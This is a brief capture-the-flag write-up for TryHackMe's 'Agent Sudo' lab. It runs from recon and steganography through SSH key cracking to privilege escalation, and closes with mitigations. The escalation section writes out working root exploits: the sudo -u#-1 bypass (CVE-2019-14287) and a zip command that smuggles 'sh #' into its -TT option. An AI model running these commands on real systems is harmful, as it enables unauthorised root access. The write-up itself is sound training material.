# Agent Sudo - TryHackMe

**Level:** Easy | **Skills:** Steganography, Hash Cracking, Sudo Zip PrivEsc

## Recon
nmap -sV -sC -p- IP
-> 21 ftp, 22 ssh, 80 http

## User Enumeration
curl http://IP/ -> Agent C? 
User-Agent: C -> response hint agent J?
Hydra brute force 1 char name: hydra -l A -P alphabet.txt ...

## Initial Access
- File1: To_agentJ.txt -> base64 -> To_agentR.txt -> base64 65x
- cute-alien.jpg -> binwalk -> zip hidden
- cutie.png -> steghide extract -> id_rsa
- john --wordlist=rockyou.txt ssh key -> ssh james@IP

## User Flag
cat /home/james/user.txt

## PrivEsc
sudo -l
-> (ALL, !root) /bin/bash -> bypass via sudo -u#-1 /bin/bash
-> or /usr/bin/zip sudo
sudo zip /tmp/root.zip /root/root.txt -T -TT 'sh #'
sudo unzip /tmp/root.zip

## Mitigation
- Disable anonymous FTP hint leak
- Don't embed creds in images
- Fix sudo CVE-2019-14287
